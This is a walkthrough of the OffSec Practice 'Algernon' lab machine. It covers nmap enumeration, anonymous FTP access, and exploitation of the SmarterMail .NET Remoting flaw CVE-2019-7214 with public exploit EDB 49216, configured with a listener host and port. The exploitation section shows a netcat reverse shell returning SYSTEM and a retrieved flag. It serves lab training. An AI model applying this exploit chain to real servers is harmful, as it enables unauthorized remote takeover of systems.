# Algernon: Offsec Practice's Walkthrough

![DeepAI Generated Image](https://github.com/het-desai/Offsec-CTF/blob/main/Practice/Algernon/screenshots/deepai.jpg 'DeepAI Generated Image')

## Introduction

This report documents the methodology and exploitation process used to gain administrative access to the Algernon machine from the OffSec Practice lab. The assessment followed a structured workflow beginning with network enumeration, service discovery, and vulnerability identification, ultimately leading to successful remote code execution (RCE) through a known SmarterMail exploit. All findings and steps are presented in a clear, reproducible manner consistent with professional penetration testing standards.

## Machine Enumeration

An initial Nmap scan was performed to identify open ports and running services.

```
┌──(kali㉿kali)-[~/offsec/Practice/Algernon]
└─$ nmap -sC -sV 192.168.241.65 -oN nmap.init.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 13:50 EDT
Nmap scan report for 192.168.241.65
Host is up (0.015s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 10-01-25  08:01AM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_10-01-25  08:01AM       <DIR>          Spool
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
9998/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Wed, 01 Oct 2025 15:03:34 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
|_http-server-header: Microsoft-IIS/10.0
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -2h47m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-01T15:03:39
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.71 seconds
```

The scan revealed several open ports, including FTP (21), HTTP (80), SMB (445), and an additional HTTP service on port 9998. While reviewing ports 21, 80, 445, and 9998, a full TCP port scan was executed in the background:

```
┌──(kali㉿kali)-[~/offsec/Practice/Algernon]
└─$ nmap -p- 192.168.241.65 -oN nmap.all.ports.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 14:21 EDT
Nmap scan report for 192.168.241.65
Host is up (0.029s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
9998/tcp  open  distinct32
17001/tcp open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 25.67 seconds
```

The full scan revealed additional ports such as 5040, 17001, and several high-numbered RPC ports. These were enumerated further using version detection:

```
┌──(kali㉿kali)-[~/offsec/Practice/Algernon]
└─$ nmap -p 5040,17001,49664,49665,49666,49667,49668,49669 -sC -sV 192.168.241.65 -oN nmap.detail.tcp.txt      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 14:26 EDT
Nmap scan report for 192.168.241.65
Host is up (0.0082s latency).

PORT      STATE SERVICE       VERSION
5040/tcp  open  unknown
17001/tcp open  remoting      MS .NET Remoting services
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -2h42m41s
| smb2-time: 
|   date: 2025-10-01T15:46:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.14 seconds
```

Port 17001 was identified as MS .NET Remoting services, which later proved relevant for exploitation.

Anonymous (`anonymous:anonymous`) login was allowed, but the accessible directories (ImapRetrieval, Logs, PopRetrieval, Spool) contained no useful information.

```
┌──(kali㉿kali)-[~/offsec/Practice/Algernon/exploit]
└─$ ftp 192.168.228.65
Connected to 192.168.228.65.
220 Microsoft FTP Service
Name (192.168.228.65:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
229 Entering Extended Passive Mode (|||49755|)
125 Data connection already open; Transfer starting.
04-29-20  09:31PM       <DIR>          ImapRetrieval
11-14-25  11:21AM       <DIR>          Logs
04-29-20  09:31PM       <DIR>          PopRetrieval
04-29-20  09:32PM       <DIR>          Spool
226 Transfer complete.
```

Port 80 served the default IIS homepage.

![Port 80 First Look](https://github.com/het-desai/Offsec-CTF/blob/main/Practice/Algernon/screenshots/Port80FirstLook.png 'Port 80 First Look')

Port 9998 hosted an undocumented web interface that appeared to be related to SmarterMail.

![Port 9998 First Look](https://github.com/het-desai/Offsec-CTF/blob/main/Practice/Algernon/screenshots/Port9998FirstLook.png 'Port 9998 First Look')

## Exploitation

Given the presence of SmarterMail components, a search was performed for relevant vulnerabilities.

![Google Search Result](https://github.com/het-desai/Offsec-CTF/blob/main/Practice/Algernon/screenshots/GoogleSearchResult.png "Google Search Result")

A matching exploit was identified:

- Exploit-DB ID: 49216

- Vulnerability: SmarterMail Build 6985 – Remote Code Execution

- CVE: CVE-2019-7214

- Type: Pre-auth RCE via .NET Remoting

[Exploit-DB: 49216](https://www.exploit-db.com/exploits/49216)

[NVD: CVE-2019-7214](https://nvd.nist.gov/vuln/detail/CVE-2019-7214)

```
┌──(kali㉿kali)-[~/offsec/Practice/Algernon/exploit]
└─$ searchsploit SmarterMail Build
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
SmarterMail Build 6985 - Remote Code Execution                                                                                            | windows/remote/49216.py
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

The exploit was copied locally and modified with the appropriate target and listener configuration.

```python
# Exploit Title: SmarterMail Build 6985 - Remote Code Execution
# Exploit Author: 1F98D
# Original Author: Soroush Dalili
# Date: 10 May 2020
# Vendor Hompage: re
# CVE: CVE-2019-7214
...
...
...
HOST='192.168.241.65'
PORT=17001
LHOST='192.168.45.152'
LPORT=50505
...
...
...
```

Started a Netcat listener and ran exploit. The shell returned NT AUTHORITY\SYSTEM, confirming full system compromise.

```
---Terminal 1---
┌──(kali㉿kali)-[~/offsec/Practice/Algernon/exploit]
└─$ python3 49216.py

---Terminal 2---
┌──(kali㉿kali)-[~/offsec/Practice/Algernon/exploit]
└─$ nc -lnvp 50505                               
listening on [any] 50505 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.241.65] 49983
whoami
nt authority\system
PS C:\Windows\system32> cd \Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/29/2020   9:29 PM           1450 Microsoft Edge.lnk                                                    
-a----        10/1/2025   8:01 AM             34 proof.txt                                                             


PS C:\Users\Administrator\Desktop> type proof.txt
52ba50e48c0539b16933b34ea37d672b
```

## Conclusion

The Algernon machine was successfully compromised through a known unauthenticated RCE vulnerability in SmarterMail (CVE-2019-7214). The exploitation was made possible by identifying the .NET Remoting service exposed on port 17001 and leveraging a publicly available exploit (EDB-ID 49216). Comprehensive enumeration played a critical role in uncovering additional ports beyond the initial scan, ultimately leading to the discovery of the vulnerable service. The assessment demonstrates the importance of thorough port enumeration, service fingerprinting, and vulnerability research when approaching Windows-based targets. The machine was fully compromised with SYSTEM-level privileges, and the proof.txt flag was retrieved accordingly.